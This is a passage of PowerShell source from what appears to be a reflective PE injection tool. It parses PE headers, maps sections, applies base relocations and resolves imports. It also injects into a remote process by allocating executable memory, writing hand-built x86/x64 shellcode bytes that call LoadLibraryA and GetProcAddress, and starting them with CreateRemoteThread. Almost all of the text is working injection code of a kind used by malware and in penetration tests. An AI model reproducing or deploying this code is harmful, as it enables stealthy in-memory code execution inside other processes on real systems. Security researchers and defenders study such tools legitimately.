	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
